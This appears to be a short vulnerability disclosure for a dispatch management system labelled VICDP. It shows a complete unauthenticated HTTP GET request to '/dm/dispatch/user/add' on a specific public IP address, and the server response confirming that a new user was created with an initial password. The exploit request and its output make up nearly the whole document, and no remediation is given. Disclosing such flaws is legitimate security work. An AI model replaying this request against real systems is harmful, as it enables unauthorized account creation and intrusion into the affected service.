VICDP-Unauthorized Access (/dm/dispatch/user/add) 

Vendor Homepage:
```
https://101.42.223.194:6443/
```

Version: 

```
V1
```

Affected Page:

```
https://101.42.223.194:6443/
```

Request:

```
GET /dm/dispatch/user/add?numberStart=1&numberEnd=2&orgid=1&scope=1&kind=1&point=2&gatewayName=1&useIce=2&seeall=2&phorex=8654102 HTTP/1.1
Host: 101.42.223.194:6443
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://101.42.223.194:6443/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1
Connection: close
```

Respose:

```
HTTP/1.1 200 
Server: nginx
Date: Fri, 06 Feb 2026 03:13:34 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
Content-Length: 108

{"msg":"添加成功，初始密码为12aa34zz","code":200,"data":{"id":"0a2bf101ff1b4a32a72cd97c743b2414"}}
```

<img width="865" height="516" alt="image" src="https://github.com/user-attachments/assets/0a3378c9-986f-4432-bc15-3382ed54a3c6" />
